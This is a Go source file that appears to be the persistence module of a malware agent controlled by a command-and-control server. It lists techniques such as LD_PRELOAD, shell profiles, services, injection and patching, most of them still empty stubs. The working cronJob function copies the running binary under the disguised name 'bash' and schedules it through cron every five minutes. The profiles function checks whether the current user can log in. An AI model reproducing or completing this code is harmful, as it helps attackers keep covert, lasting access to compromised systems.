package agent

import (
	"errors"
	"os"
	"os/user"
	"strings"
)

// TODO

// PersistMethods CC calls one of these methods to get persistence, or all of them at once
var PersistMethods = map[string]func() error{
	"all":        allInOne,
	"ld_preload": ldPreload,
	"profiles":   profiles,
	"service":    service,
	"injector":   injector,
	"task":       task,
	"patcher":    patcher,
}

// allInOne called by ccHandler
func allInOne() (err error) {
	return
}

func cronJob() (err error) {
	err = Copy(os.Args[0], "bash")
	if err != nil {
		return
	}

	pwd, err := os.Getwd()
	if err != nil {
		return
	}
	AddCronJob("*/5 * * * * " + pwd + "/bash")
	return
}

func profiles() (err error) {
	user, err := user.Current()
	accountInfo, err := CheckAccount(user.Name)

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("This user cannot login")
		}
	}

	return
}

func ldPreload() (err error) {
	return
}

func injector() (err error) {
	return
}

func service() (err error) {
	return
}

func task() (err error) {
	return
}

func patcher() (err error) {
	return
}
